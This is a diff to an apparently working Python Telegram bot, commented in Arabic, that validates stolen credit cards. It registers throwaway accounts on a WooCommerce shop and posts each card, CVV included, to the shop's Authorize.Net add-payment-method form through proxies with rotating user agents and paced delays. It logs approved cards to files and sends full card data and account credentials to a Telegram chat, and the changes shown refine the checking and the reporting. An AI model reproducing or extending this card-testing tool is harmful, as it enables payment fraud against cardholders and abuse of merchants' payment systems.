@@ -15,6 +15,7 @@ import fake_useragent
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 import asyncio
+import sys
 
 # ==================== تهيئة Flask ====================
 app = Flask('')
@@ -49,7 +50,7 @@ checking_active = False
 checking_thread = None
 auto_update_task = None
 
-# متغيرات الإحصائيات
+# متغيرات الإحصائيات - يجب تعريفها كـ global في كل دالة
 stats = {
     'total': 0,
     'checked': 0,
@@ -62,7 +63,8 @@ stats = {
     'current_account_cards': 0,
     'total_account_cards': 0,
     'current_email': '',
-    'current_password': ''
+    'current_password': '',
+    'last_update_time': 0
 }
 
 # ==================== الكود الأصلي للأداة ====================
@@ -134,48 +136,117 @@ class AuthorizeNetChecker:
                 return "ERROR", "Invalid CC format"
             
             cc, mm, yy, cvv = cc_line.strip().split("|")
-            exp_formatted = f"{mm} / {yy[-2:]}"
+            
+            # تنسيق التاريخ
+            if len(yy) == 4:
+                yy = yy[-2:]
+            exp_formatted = f"{mm} / {yy}"
+            
+            # تنظيف رقم البطاقة
+            cc = cc.replace(" ", "").replace("-", "")
+            
+            print(f"{Fore.CYAN}[*] فحص البطاقة: {cc[:4]}...{cc[-4:]} | {mm}/{yy} | {cvv}")
             
             resp = self.session.get(ADD_PAYMENT_URL, proxies=self.proxy, timeout=20)
-            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
             
-            if not nonce_match:
-                return "ERROR", "Could not find add-payment-method nonce"
+            # البحث عن nonce
+            nonce_patterns = [
+                r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',
+                r'id="woocommerce-add-payment-method-nonce".*?value="(.*?)"',
+                r'name="_wpnonce".*?value="(.*?)"'
+            ]
             
-            nonce = nonce_match.group(1)
+            nonce = None
+            for pattern in nonce_patterns:
+                nonce_match = re.search(pattern, resp.text, re.IGNORECASE)
+                if nonce_match:
+                    nonce = nonce_match.group(1)
+                    break
             
+            if not nonce:
+                print(f"{Fore.RED}[!] لم يتم العثور على nonce")
+                return "ERROR", "Could not find payment nonce"
+            
+            # تجهيز البيانات
             payload = {
                 "payment_method": "yith_wcauthnet_credit_card_gateway",
-                "yith_wcauthnet_credit_card_gateway-card-number": cc.replace(" ", "+"),
+                "yith_wcauthnet_credit_card_gateway-card-number": cc,
                 "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                 "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
-                "yith_wcauthnet_credit_card_gateway-card-type": "",
                 "woocommerce-add-payment-method-nonce": nonce,
                 "_wp_http_referer": "/my-account/add-payment-method/",
                 "woocommerce_add_payment_method": "1"
             }
             
-            resp = self.session.post(ADD_PAYMENT_URL, data=payload, proxies=self.proxy, timeout=30)
+            # إضافة headers إضافية
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": BASE_URL,
+                "Referer": ADD_PAYMENT_URL
+            }
+            self.session.headers.update(headers)
             
-            if "Payment method successfully added" in resp.text:
-                return "succeed", "Success"
-            elif "declined" in resp.text.lower() or "error" in resp.text.lower():
-                err_match = re.search(r'class="woocommerce-error" role="alert">(.*?)</ul>', resp.text, re.DOTALL)
-                if err_match:
-                    clean_err = re.sub('<[^<]+?>', '', err_match.group(1)).strip()
-                    return "DECLINED", clean_err
-                return "DECLINED", "Card Declined"
-            else:
-                return "DECLINED", "Unknown result"
+            # إرسال الطلب
+            resp = self.session.post(ADD_PAYMENT_URL, data=payload, proxies=self.proxy, timeout=30, allow_redirects=True)
+            
+            # تحليل النتيجة
+            response_text = resp.text.lower()
+            
+            # البحث عن رسائل النجاح
+            success_patterns = [
+                "payment method successfully added",
+                "تم إضافة طريقة الدفع",
+                "payment method added",
+                "successfully added"
+            ]
+            
+            for pattern in success_patterns:
+                if pattern in response_text:
+                    print(f"{Fore.GREEN}[✅] بطاقة صالحة: {cc[:4]}...{cc[-4:]}")
+                    return "succeed", "Payment method added successfully"
+            
+            # البحث عن رسائل الرفض
+            declined_patterns = [
+                "declined",
+                "رفضت",
+                "insufficient funds",
+                "card declined",
+                "do not honor",
+                "invalid card",
+                "expired card"
+            ]
+            
+            for pattern in declined_patterns:
+                if pattern in response_text:
+                    # محاولة استخراج رسالة الخطأ كاملة
+                    error_match = re.search(r'<div class="woocommerce-error"[^>]*>(.*?)</div>', resp.text, re.DOTALL | re.IGNORECASE)
+                    if error_match:
+                        error_text = re.sub('<[^<]+?>', '', error_match.group(1)).strip()
+                        print(f"{Fore.RED}[❌] بطاقة مرفوضة: {error_text[:100]}")
+                        return "DECLINED", error_text
+                    print(f"{Fore.RED}[❌] بطاقة مرفوضة: {pattern}")
+                    return "DECLINED", f"Card {pattern}"
+            
+            # إذا لم نجد رسالة محددة
+            if "error" in response_text:
+                error_match = re.search(r'<div class="woocommerce-error"[^>]*>(.*?)</div>', resp.text, re.DOTALL | re.IGNORECASE)
+                if error_match:
+                    error_text = re.sub('<[^<]+?>', '', error_match.group(1)).strip()
+                    print(f"{Fore.RED}[❌] خطأ: {error_text[:100]}")
+                    return "DECLINED", error_text
+            
+            print(f"{Fore.YELLOW}[⚠️] نتيجة غير معروفة")
+            return "DECLINED", "Unknown response"
                 
         except Exception as e:
+            print(f"{Fore.RED}[!] استثناء: {str(e)}")
             return "ERROR", str(e)
 
 # دالة إنشاء شريط التقدم
-def create_progress_bar(percentage, width=20):
+def create_progress_bar(percentage, width=15):
     filled = int(width * percentage / 100)
     bar = '▓' * filled + '░' * (width - filled)
-    return f"`[{bar}]` {percentage:.1f}%"
+    return f"{bar} {percentage:.1f}%"
 
 # دالة حساب الوقت المنقضي
 def format_time(seconds):
@@ -185,27 +256,41 @@ def format_time(seconds):
     return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
 
 # دالة إرسال البطاقة الصالحة فوراً
-async def send_approved_instant(cc_line, msg, email, password, chat_id, bot):
+async def send_approved_instant(cc_line, msg, email, password, chat_id, bot, account_num, total_accounts, card_num, total_cards):
     try:
         # تنسيق رقم البطاقة
         cc_parts = cc_line.split('|')
         card_number = cc_parts[0]
-        formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
+        
+        # تنسيق البطاقة للعرض
+        if len(card_number) == 16:
+            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, 16, 4)])
+        else:
+            formatted_card = card_number
+        
+        # تنسيق التاريخ
+        mm = cc_parts[1]
+        yy = cc_parts[2]
+        if len(yy) == 4:
+            yy = yy[-2:]
         
         message = f"""
 ╔══════════════════════════════════╗
 ║     🎉 *بطاقة صالحة!* 🎉        ║
 ╠══════════════════════════════════╣
+║ 📍 *الموقع:* الحساب {account_num}/{total_accounts}     ║
+║ 💳 *البطاقة:* {card_num}/{total_cards}          ║
+╠══════════════════════════════════╣
 ║ 💳 *بيانات البطاقة:*             ║
 ║ ┌────────────────────────────┐   ║
 ║ │ {formatted_card}           ║
-║ │ {cc_parts[1]}/{cc_parts[2][-2:]}                  ║
+║ │ {mm}/{yy}                      ║
 ║ │ CVV: {cc_parts[3]}                 ║
 ║ └────────────────────────────┘   ║
 ╠══════════════════════════════════╣
 ║ 📧 *الحساب المستخدم:*            ║
 ║ ┌────────────────────────────┐   ║
-║ │ 📧 {email[:20]}...    ║
+║ │ 📧 {email[:25]}...  ║
 ║ │ 🔑 {password[:15]}...       ║
 ║ └────────────────────────────┘   ║
 ╠══════════════════════════════════╣
@@ -217,9 +302,94 @@ async def send_approved_instant(cc_line, msg, email, password, chat_id, bot):
             text=message,
             parse_mode='Markdown'
         )
-        print(f"{Fore.GREEN}[✓] تم إرسال البطاقة الصالحة فوراً: {cc_line}")
+        print(f"{Fore.GREEN}[✓] تم إرسال البطاقة الصالحة: {card_number[:4]}...{card_number[-4:]}")
+        return True
     except Exception as e:
         print(f"{Fore.RED}[✗] فشل إرسال البطاقة: {str(e)}")
+        return False
+
+# دالة إرسال البطاقة المرفوضة
+async def send_declined_message(cc_line, msg, chat_id, bot, account_num, total_accounts, card_num, total_cards):
+    try:
+        # تنسيق رقم البطاقة
+        cc_parts = cc_line.split('|')
+        card_number = cc_parts[0]
+        
+        # تنسيق البطاقة للعرض
+        if len(card_number) == 16:
+            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, 16, 4)])
+            display_card = f"{card_number[:4]}...{card_number[-4:]}"
+        else:
+            formatted_card = card_number
+            display_card = card_number[:8] + "..."
+        
+        # تنسيق التاريخ
+        mm = cc_parts[1]
+        yy = cc_parts[2]
+        if len(yy) == 4:
+            yy = yy[-2:]
+        
+        message = f"""
+╔══════════════════════════════════╗
+║     ❌ *بطاقة مرفوضة*           ║
+╠══════════════════════════════════╣
+║ 📍 الحساب: {account_num}/{total_accounts}           ║
+║ 💳 البطاقة: {card_num}/{total_cards}            ║
+╠══════════════════════════════════╣
+║ 💳 الرقم: `{display_card}`        ║
+║ 📅 التاريخ: {mm}/{yy}                      ║
+║ 🔐 الرمز: {cc_parts[3]}                        ║
+╠══════════════════════════════════╣
+║ ⚠️ *السبب:* {msg[:150]}      ║
+╚══════════════════════════════════╝"""
+
+        await bot.send_message(
+            chat_id=chat_id,
+            text=message,
+            parse_mode='Markdown'
+        )
+        print(f"{Fore.RED}[✓] تم إرسال البطاقة المرفوضة: {card_number[:4]}...{card_number[-4:]}")
+        return True
+    except Exception as e:
+        print(f"{Fore.RED}[✗] فشل إرسال البطاقة المرفوضة: {str(e)}")
+        return False
+
+# دالة إرسال الخطأ
+async def send_error_message(cc_line, msg, chat_id, bot, account_num, total_accounts, card_num, total_cards):
+    try:
+        # تنسيق رقم البطاقة
+        cc_parts = cc_line.split('|')
+        card_number = cc_parts[0]
+        
+        # تنسيق البطاقة للعرض
+        if len(card_number) == 16:
+            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, 16, 4)])
+            display_card = f"{card_number[:4]}...{card_number[-4:]}"
+        else:
+            display_card = card_number[:8] + "..."
+        
+        message = f"""
+╔══════════════════════════════════╗
+║     ⚠️ *خطأ في الفحص*           ║
+╠══════════════════════════════════╣
+║ 📍 الحساب: {account_num}/{total_accounts}           ║
+║ 💳 البطاقة: {card_num}/{total_cards}            ║
+╠══════════════════════════════════╣
+║ 💳 الرقم: `{display_card}`        ║
+╠══════════════════════════════════╣
+║ ❗ *الخطأ:* {msg[:150]}          ║
+╚══════════════════════════════════╝"""
+
+        await bot.send_message(
+            chat_id=chat_id,
+            text=message,
+            parse_mode='Markdown'
+        )
+        print(f"{Fore.YELLOW}[✓] تم إرسال رسالة الخطأ: {card_number[:4]}...{card_number[-4:]}")
+        return True
+    except Exception as e:
+        print(f"{Fore.RED}[✗] فشل إرسال رسالة الخطأ: {str(e)}")
+        return False
 
 # دالة إرسال تحديث الحالة
 async def send_status_update(chat_id, bot):
@@ -289,10 +459,12 @@ async def send_status_update(chat_id, bot):
 
 # دالة إرسال تحديث كل دقيقة
 async def auto_status_updater(chat_id, bot):
-    global checking_active, stop_checking
+    global checking_active, stop_checking, stats
     while checking_active and not stop_checking:
-        await asyncio.sleep(60)  # انتظار دقيقة
+        await asyncio.sleep(30)  # انتظار 30 ثانية
         if checking_active and not stop_checking:
+            # تحديث stats قبل الإرسال
+            stats['last_update_time'] = time.time()
             await send_status_update(chat_id, bot)
 
 # دالة إنشاء أزرار التحكم
@@ -317,6 +489,13 @@ def worker_single_file(chat_id, bot):
     """وظيفة المعالجة من ملف abood.txt"""
     global current_chat_id, current_bot, stop_checking, checking_active, stats, auto_update_task
     
+    # الحصول على loop
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    except:
+        loop = asyncio.get_event_loop()
+    
     current_chat_id = chat_id
     current_bot = bot
     stop_checking = False
@@ -335,30 +514,39 @@ def worker_single_file(chat_id, bot):
         'current_account_cards': 0,
         'total_account_cards': 0,
         'current_email': '',
-        'current_password': ''
+        'current_password': '',
+        'last_update_time': time.time()
     }
     
     try:
         # قراءة الملف
-        with open("abood.txt", "r", encoding='utf-8') as f:
+        if not os.path.exists("abood.txt"):
+            asyncio.run_coroutine_threadsafe(
+                bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt غير موجود!", reply_markup=get_control_keyboard()),
+                loop
+            )
+            checking_active = False
+            return False
+            
+        with open("abood.txt", "r", encoding='utf-8', errors='ignore') as f:
             lines = [l.strip() for l in f.readlines() if l.strip()]
         
         if not lines:
             asyncio.run_coroutine_threadsafe(
                 bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt فارغ!"),
-                asyncio.get_event_loop()
+                loop
             )
             checking_active = False
             return False
         
         stats['total'] = len(lines)
         
-        # تحديد عدد البطاقات لكل حساب (5 بطاقات)
-        cards_per_account = 5
+        # تحديد عدد البطاقات لكل حساب (3 بطاقات لتسريع الفحص)
+        cards_per_account = 3
         stats['total_accounts'] = (len(lines) + cards_per_account - 1) // cards_per_account
         
         # حساب الوقت المتوقع
-        estimated_time = stats['total_accounts'] * 150  # كل حساب حوالي 150 ثانية
+        estimated_time = stats['total_accounts'] * 90  # كل حساب حوالي 90 ثانية
         estimated_time_str = format_time(estimated_time)
         
         # إرسال رسالة بدء الفحص مع ملخص كامل
@@ -382,16 +570,21 @@ def worker_single_file(chat_id, bot):
                 parse_mode='Markdown',
                 reply_markup=get_control_keyboard()
             ),
-            asyncio.get_event_loop()
+            loop
         )
         
         # بدء التحديث التلقائي
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        auto_update_task = loop.create_task(auto_status_updater(chat_id, bot))
+        auto_update_task = asyncio.run_coroutine_threadsafe(
+            auto_status_updater(chat_id, bot),
+            loop
+        )
         
         print(f"{Fore.CYAN}تم العثور على {len(lines)} بطاقة في ملف abood.txt")
         print(f"{Fore.YELLOW}سيتم استخدام {stats['total_accounts']} حساب (كل حساب {cards_per_account} بطاقات)")
+        
+        approved_list = []
+        declined_list = []
+        error_list = []
         
         for account_num in range(stats['total_accounts']):
             # التحقق من طلب الإيقاف
@@ -408,11 +601,6 @@ def worker_single_file(chat_id, bot):
 ║ ✅ الناجحة:         {stats['approved']}          ║
 ║ ❌ المرفوضة:        {stats['declined']}          ║
 ║ ⚠️ الأخطاء:         {stats['errors']}           ║
-╠══════════════════════════════════╣
-║ 💾 *تم حفظ:*                     ║
-║ • ✅ APPROVED.txt ({stats['approved']} بطاقة)   ║
-║ • ❌ declined.txt ({stats['declined']} بطاقة)  ║
-║ • ⚠️ error.txt ({stats['errors']} بطاقات)     ║
 ╚══════════════════════════════════╝"""
                 
                 asyncio.run_coroutine_threadsafe(
@@ -422,7 +610,7 @@ def worker_single_file(chat_id, bot):
                         parse_mode='Markdown',
                         reply_markup=get_control_keyboard()
                     ),
-                    asyncio.get_event_loop()
+                    loop
                 )
                 break
             
@@ -436,23 +624,6 @@ def worker_single_file(chat_id, bot):
             
             print(f"\n{Fore.MAGENTA}{'='*60}")
             print(f"{Fore.YELLOW}🔄 إنشاء حساب رقم {account_num + 1}/{stats['total_accounts']}")
-            
-            # إرسال رسالة بدء الحساب الجديد
-            account_start_message = f"""
-╔══════════════════════════════════╗
-║     📌 *الحساب {account_num + 1}/{stats['total_accounts']}*     ║
-╠══════════════════════════════════╣
-║ ⏳ جاري إنشاء حساب جديد...       ║
-╚══════════════════════════════════╝"""
-            
-            asyncio.run_coroutine_threadsafe(
-                bot.send_message(
-                    chat_id=chat_id,
-                    text=account_start_message,
-                    parse_mode='Markdown'
-                ),
-                asyncio.get_event_loop()
-            )
             
             # إنشاء حساب جديد
             checker = AuthorizeNetChecker()
@@ -475,13 +646,14 @@ def worker_single_file(chat_id, bot):
                         text=fail_message,
                         parse_mode='Markdown'
                     ),
-                    asyncio.get_event_loop()
+                    loop
                 )
                 
                 # حفظ البطاقات في error
                 for cc_line in account_cards:
                     stats['errors'] += 1
                     stats['checked'] += 1
+                    error_list.append(f"{cc_line} - فشل إنشاء الحساب")
                     with file_lock:
                         with open("error.txt", "a", encoding="utf-8") as f:
                             f.write(f"{cc_line} - فشل إنشاء الحساب\n")
@@ -513,7 +685,7 @@ def worker_single_file(chat_id, bot):
                     text=account_success_message,
                     parse_mode='Markdown'
                 ),
-                asyncio.get_event_loop()
+                loop
             )
             
             for i, cc_line in enumerate(account_cards, 1):
@@ -527,18 +699,21 @@ def worker_single_file(chat_id, bot):
                 # تنسيق رقم البطاقة للعرض
                 cc_parts_display = cc_line.split('|')
                 card_num_display = cc_parts_display[0]
-                formatted_card_display = ' '.join([card_num_display[j:j+4] for j in range(0, len(card_num_display), 4)])
+                if len(card_num_display) == 16:
+                    formatted_card_display = ' '.join([card_num_display[j:j+4] for j in range(0, 16, 4)])
+                else:
+                    formatted_card_display = card_num_display
                 
                 print(f"\n{Fore.WHITE}[الحساب {account_num + 1} - بطاقة {i}/{len(account_cards)}] جاري فحص: {cc_line}")
                 
                 # إرسال رسالة بدء فحص البطاقة
                 card_start_message = f"""
 ╔══════════════════════════════════╗
-║     💳 *البطاقة {i}/{len(account_cards)}*         ║
-║     في الحساب {account_num + 1}/{stats['total_accounts']}           ║
+║     💳 *جاري فحص البطاقة*       ║
+║        {i}/{len(account_cards)} في الحساب {account_num + 1}        ║
 ╠══════════════════════════════════╣
 ║ الرقم: `{formatted_card_display}`    ║
-║ التاريخ: {cc_parts_display[1]}|{cc_parts_display[2][-2:]}              ║
+║ التاريخ: {cc_parts_display[1]}/{cc_parts_display[2][:2]}              ║
 ║ الرمز: {cc_parts_display[3]}                        ║
 ╚══════════════════════════════════╝"""
                 
@@ -548,92 +723,84 @@ def worker_single_file(chat_id, bot):
                         text=card_start_message,
                         parse_mode='Markdown'
                     ),
-                    asyncio.get_event_loop()
+                    loop
                 )
                 
+                # فحص البطاقة
                 status, msg = checker.check_card(cc_line)
                 elapsed_time = time.time() - start_time_card
                 
                 # تحديث الإحصائيات
                 stats['checked'] += 1
                 
+                # حفظ النتائج وإرسالها فوراً
                 with file_lock:
                     if status == "succeed":
                         print(f"{Fore.GREEN}[✅ APPROVED] {cc_line} - {msg}")
+                        approved_list.append(f"{cc_line} - {msg} - {checker.current_email}")
                         with open("APPROVED.txt", "a", encoding="utf-8") as f: 
                             f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                         stats['approved'] += 1
                         
                         # إرسال البطاقة الصالحة فوراً
                         asyncio.run_coroutine_threadsafe(
-                            send_approved_instant(cc_line, msg, checker.current_email, checker.current_password, chat_id, bot),
-                            asyncio.get_event_loop()
+                            send_approved_instant(
+                                cc_line, msg, checker.current_email, checker.current_password, 
+                                chat_id, bot, account_num + 1, stats['total_accounts'], 
+                                i, len(account_cards)
+                            ),
+                            loop
                         )
                         
                     elif status == "DECLINED":
                         print(f"{Fore.RED}[❌ DECLINED] {cc_line} - {msg}")
+                        declined_list.append(f"{cc_line} - {msg} - {checker.current_email}")
                         with open("declined.txt", "a", encoding="utf-8") as f: 
                             f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                         stats['declined'] += 1
                         
-                        # إرسال رسالة الرفض
-                        declined_message = f"""
-╔══════════════════════════════════╗
-║     ❌ *بطاقة مرفوضة*           ║
-╠══════════════════════════════════╣
-║ الرقم: `{formatted_card_display}`    ║
-║ السبب: {msg[:50]}...              ║
-╚══════════════════════════════════╝"""
-                        
+                        # إرسال البطاقة المرفوضة فوراً
                         asyncio.run_coroutine_threadsafe(
-                            bot.send_message(
-                                chat_id=chat_id,
-                                text=declined_message,
-                                parse_mode='Markdown'
+                            send_declined_message(
+                                cc_line, msg, chat_id, bot, 
+                                account_num + 1, stats['total_accounts'], 
+                                i, len(account_cards)
                             ),
-                            asyncio.get_event_loop()
+                            loop
                         )
                         
-                    else:
-                        print(f"{Fore.WHITE}[⚠️ ERROR] {cc_line} - {msg}")
+                    else:  # ERROR
+                        print(f"{Fore.YELLOW}[⚠️ ERROR] {cc_line} - {msg}")
+                        error_list.append(f"{cc_line} - {msg} - {checker.current_email}")
                         with open("error.txt", "a", encoding="utf-8") as f: 
                             f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                         stats['errors'] += 1
                         
                         # إرسال رسالة الخطأ
-                        error_message = f"""
-╔══════════════════════════════════╗
-║     ⚠️ *خطأ في الفحص*           ║
-╠══════════════════════════════════╣
-║ الرقم: `{formatted_card_display}`    ║
-║ الخطأ: {msg[:50]}...              ║
-╚══════════════════════════════════╝"""
-                        
                         asyncio.run_coroutine_threadsafe(
-                            bot.send_message(
-                                chat_id=chat_id,
-                                text=error_message,
-                                parse_mode='Markdown'
+                            send_error_message(
+                                cc_line, msg, chat_id, bot,
+                                account_num + 1, stats['total_accounts'],
+                                i, len(account_cards)
                             ),
-                            asyncio.get_event_loop()
+                            loop
                         )
                 
-                # إرسال تحديث كل 5 بطاقات
-                if stats['checked'] % 5 == 0:
+                # إرسال تحديث كل 3 بطاقات
+                if stats['checked'] % 3 == 0:
                     asyncio.run_coroutine_threadsafe(
                         send_status_update(chat_id, bot),
-                        asyncio.get_event_loop()
+                        loop
                     )
                 
-                # انتظار 20 ثانية قبل البطاقة التالية
+                # انتظار 15 ثانية قبل البطاقة التالية
                 if i < len(account_cards) and not stop_checking:
-                    wait_time = 20
+                    wait_time = 15
                     remaining_wait = max(0, wait_time - elapsed_time)
                     
                     if remaining_wait > 0:
                         print(f"{Fore.BLUE}⏳ انتظار {remaining_wait:.1f} ثانية...")
                         
-                        # إرسال رسالة الانتظار
                         wait_message = f"""
 ⏳ *انتظار {int(remaining_wait)} ثانية قبل البطاقة التالية...*"""
                         
@@ -643,7 +810,7 @@ def worker_single_file(chat_id, bot):
                                 text=wait_message,
                                 parse_mode='Markdown'
                             ),
-                            asyncio.get_event_loop()
+                            loop
                         )
                         
                         # انتظار مع التحقق من الإيقاف
@@ -658,14 +825,18 @@ def worker_single_file(chat_id, bot):
                     f.write(f"\n=== الحساب {account_num + 1}: {checker.current_email} | الباسورد: {checker.current_password} | تم فحص {len(account_cards)} بطاقات ===\n")
                     
                     # حساب نتائج هذا الحساب
-                    account_approved = sum(1 for line in open("APPROVED.txt", "r", encoding='utf-8') if checker.current_email in line) if os.path.exists("APPROVED.txt") else 0
-                    account_declined = sum(1 for line in open("declined.txt", "r", encoding='utf-8') if checker.current_email in line) if os.path.exists("declined.txt") else 0
-                    account_errors = sum(1 for line in open("error.txt", "r", encoding='utf-8') if checker.current_email in line) if os.path.exists("error.txt") else 0
+                    account_approved = sum(1 for line in approved_list if checker.current_email in line) if approved_list else 0
+                    account_declined = sum(1 for line in declined_list if checker.current_email in line) if declined_list else 0
+                    account_errors = sum(1 for line in error_list if checker.current_email in line) if error_list else 0
                     
                     f.write(f"نتائج الحساب: ✅ {account_approved} | ❌ {account_declined} | ⚠️ {account_errors}\n")
                     f.write("="*50 + "\n")
             
             # إرسال ملخص الحساب
+            account_approved = sum(1 for line in approved_list if checker.current_email in line) if approved_list else 0
+            account_declined = sum(1 for line in declined_list if checker.current_email in line) if declined_list else 0
+            account_errors = sum(1 for line in error_list if checker.current_email in line) if error_list else 0
+            
             account_summary = f"""
 ╔══════════════════════════════════╗
 ║   ✅ *اكتمال الحساب {account_num + 1}/{stats['total_accounts']}*    ║
@@ -681,12 +852,13 @@ def worker_single_file(chat_id, bot):
 ║ │ ✅ الناجحة:    {account_approved}           ║
 ║ │ ❌ المرفوضة:   {account_declined}           ║
 ║ │ ⚠️ الأخطاء:    {account_errors}           ║
-║ │ 📈 نسبة نجاح:  {(account_approved/len(account_cards)*100):.1f}%     ║
+║ │ 📈 نسبة نجاح:  {(account_approved/len(account_cards)*100) if account_cards else 0:.1f}%     ║
 ║ └────────────────────────────┘   ║
 ╠══════════════════════════════════╣
-║ 📈 *الإحصائيات الكلية الجديدة:*  ║
-║ ✅ الناجحة: {stats['approved'] - account_approved} ← {stats['approved']} ║
-║ ❌ المرفوضة: {stats['declined'] - account_declined} ← {stats['declined']} ║
+║ 📈 *الإحصائيات الكلية:*  ║
+║ ✅ الناجحة: {stats['approved']}          ║
+║ ❌ المرفوضة: {stats['declined']}         ║
+║ ⚠️ الأخطاء: {stats['errors']}           ║
 ╚══════════════════════════════════╝"""
             
             asyncio.run_coroutine_threadsafe(
@@ -695,7 +867,7 @@ def worker_single_file(chat_id, bot):
                     text=account_summary,
                     parse_mode='Markdown'
                 ),
-                asyncio.get_event_loop()
+                loop
             )
             
             print(f"{Fore.GREEN}✅ الحساب {account_num + 1} اكتمل.")
@@ -713,7 +885,7 @@ def worker_single_file(chat_id, bot):
                         text=wait_message,
                         parse_mode='Markdown'
                     ),
-                    asyncio.get_event_loop()
+                    loop
                 )
                 
                 for _ in range(10):
@@ -725,7 +897,7 @@ def worker_single_file(chat_id, bot):
         if not stop_checking:
             # حساب السرعة المتوسطة
             elapsed_total = time.time() - stats['start_time']
-            avg_speed = stats['total'] / (elapsed_total / 60) if elapsed_total > 0 else 0
+            avg_speed = stats['checked'] / (elapsed_total / 60) if elapsed_total > 0 else 0
             
             final_message = f"""
 ╔══════════════════════════════════╗
@@ -743,12 +915,6 @@ def worker_single_file(chat_id, bot):
 ║ ⏱️ *الوقت:*                      ║
 ║ • المنقضي: {format_time(elapsed_total)}            ║
 ║ • السرعة: {avg_speed:.1f} بط/دقيقة    ║
-╠══════════════════════════════════╣
-║ 📁 *الملفات المتاحة:*           ║
-║ • ✅ APPROVED.txt              ║
-║ • ❌ declined.txt              ║
-║ • ⚠️ error.txt                 ║
-║ • 📋 accounts_summary.txt      ║
 ╚══════════════════════════════════╝"""
             
             asyncio.run_coroutine_threadsafe(
@@ -758,7 +924,7 @@ def worker_single_file(chat_id, bot):
                     parse_mode='Markdown',
                     reply_markup=get_control_keyboard()
                 ),
-                asyncio.get_event_loop()
+                loop
             )
             
             # إرسال ملف APPROVED.txt
@@ -772,7 +938,7 @@ def worker_single_file(chat_id, bot):
                             caption="✅ البطاقات الصالحة",
                             reply_markup=get_control_keyboard()
                         ),
-                        asyncio.get_event_loop()
+                        loop
                     )
             
             print(f"\n{Fore.GREEN}{'='*60}")
@@ -787,15 +953,17 @@ def worker_single_file(chat_id, bot):
         print(f"{Fore.RED}ملف abood.txt مش موجود!")
         asyncio.run_coroutine_threadsafe(
             bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt غير موجود!", reply_markup=get_control_keyboard()),
-            asyncio.get_event_loop()
+            loop
         )
         checking_active = False
         return False
     except Exception as e:
         print(f"{Fore.RED}حصل خطأ: {str(e)}")
+        import traceback
+        traceback.print_exc()
         asyncio.run_coroutine_threadsafe(
             bot.send_message(chat_id=chat_id, text=f"❌ حدث خطأ: {str(e)[:200]}", reply_markup=get_control_keyboard()),
-            asyncio.get_event_loop()
+            loop
         )
         checking_active = False
         return False
@@ -814,11 +982,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ╠══════════════════════════════════╣
 ║ ✨ *مميزات البوت:*                ║
 ║ • إرسال فوري للبطاقات الصالحة    ║
+║ • إرسال فوري للبطاقات المرفوضة   ║
+║ • عرض تفصيلي لكل بطاقة           ║
 ║ • إحصائيات مباشرة مع شريط تقدم   ║
-║ • عرض تفصيلي لكل حساب وبطاقة     ║
-║ • تحديث تلقائي كل دقيقة          ║
+║ • تحديث تلقائي كل 30 ثانية       ║
 ║ • أزرار تحكم كاملة               ║
-║ • إيقاف الفحص بأمان              ║
 ╚══════════════════════════════════╝
 
 📝 *صيغة الملف المطلوبة:*
@@ -861,6 +1029,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     target=worker_single_file,
                     args=(query.message.chat_id, context.bot)
                 )
+                checking_thread.daemon = True
                 checking_thread.start()
     
     elif query.data == "stop_scan":
@@ -1005,6 +1174,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             deleted.append(str(temp_file))
         
         # إعادة تعيين الإحصائيات
+        global stats
         stats = {
             'total': 0,
             'checked': 0,
@@ -1017,7 +1187,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             'current_account_cards': 0,
             'total_account_cards': 0,
             'current_email': '',
-            'current_password': ''
+            'current_password': '',
+            'last_update_time': 0
         }
         
         await query.edit_message_text(
@@ -1041,15 +1212,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ║ *مميزات العرض:*                  ║
 ║ • عرض تفصيلي لكل حساب            ║
 ║ • إحصائيات كل بطاقة              ║
-║ • شريط تقدم بصري                 ║
-║ • تحديث تلقائي كل دقيقة          ║
-║ • إرسال فوري للبطاقات الصالحة    ║
+║ • إرسال فوري للنتائج             ║
+║ • تحديث تلقائي كل 30 ثانية       ║
 ╠══════════════════════════════════╣
 ║ *كيفية الاستخدام:*               ║
 ║ 1️⃣ أرسل ملف abood.txt           ║
 ║ 2️⃣ اضغط بدء الفحص                ║
-║ 3️⃣ تابع التحديثات المباشرة      ║
-║ 4️⃣ استلم النتائج فور ظهورها     ║
+║ 3️⃣ تابع النتائج فور ظهورها      ║
 ╚══════════════════════════════════╝"""
         
         await query.edit_message_text(
@@ -1101,7 +1270,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         shutil.copy2(temp_file_path, "abood.txt")
         
         # قراءة عدد البطاقات
-        with open("abood.txt", "r", encoding='utf-8') as f:
+        with open("abood.txt", "r", encoding='utf-8', errors='ignore') as f:
             lines = [l.strip() for l in f.readlines() if l.strip()]
         
         await update.message.reply_text(
@@ -1149,7 +1318,8 @@ async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'current_account_cards': 0,
         'total_account_cards': 0,
         'current_email': '',
-        'current_password': ''
+        'current_password': '',
+        'last_update_time': 0
     }
     
     await update.message.reply_text(
